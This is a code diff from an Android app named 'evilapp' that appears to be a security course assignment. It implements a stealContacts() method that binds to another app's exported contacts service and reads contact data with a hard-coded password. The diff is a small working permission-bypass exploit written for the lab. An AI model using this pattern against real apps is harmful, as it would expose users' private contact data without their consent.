@@ -1,13 +1,20 @@
 package com.cs155.evilapp;
 
 import com.cs155.evilapp.R;
+import com.cs155.trustedapp.IGetContactsString;
+
 import android.os.Bundle;
+import android.os.IBinder;
 import android.app.Activity;
+import android.content.ComponentName;
+import android.content.Intent;
+import android.content.ServiceConnection;
 import android.util.Log;
 import android.view.View;
 import android.view.View.OnClickListener;
 import android.widget.Button;
 import android.widget.TextView;
+
 
 public class MainActivity extends Activity {
 	
@@ -45,5 +52,32 @@ public class MainActivity extends Activity {
 
     private void stealContacts() {
 	// TODO: your implementation here
+    	this.bindService(new Intent("com.cs155.trustedapp.ReadContactsService"), mConnection, BIND_AUTO_CREATE);
     }
+    
+    ServiceConnection mConnection = new ServiceConnection() {
+    	public void onServiceDisconnected(ComponentName name) {
+//    		Toast.makeText(Client.this, "Service is disconnected", 1000).show();
+//    		mBounded = false;
+//    		mServer = null;
+    	}
+    	  
+    	public void onServiceConnected(ComponentName name, IBinder service) {
+//    		System.out.println("Here I am now!");
+//    		
+    		try {
+    			IGetContactsString ser = IGetContactsString.Stub.asInterface((IBinder)service);
+    			String res = ser.GetContacts("youllnevergetmeluckycharms");
+//    			System.out.println(res);
+    			showContacts(res);
+    		}
+    		catch (Exception e){
+    			System.out.println(e);
+    		}
+//    		Toast.makeText(Client.this, "Service is connected", 1000).show();
+//    		mBounded = true;
+//    		LocalBinder mLocalBinder = (LocalBinder)service;
+//    		mServer = mLocalBinder.getServerInstance();
+    	}
+   };
 }
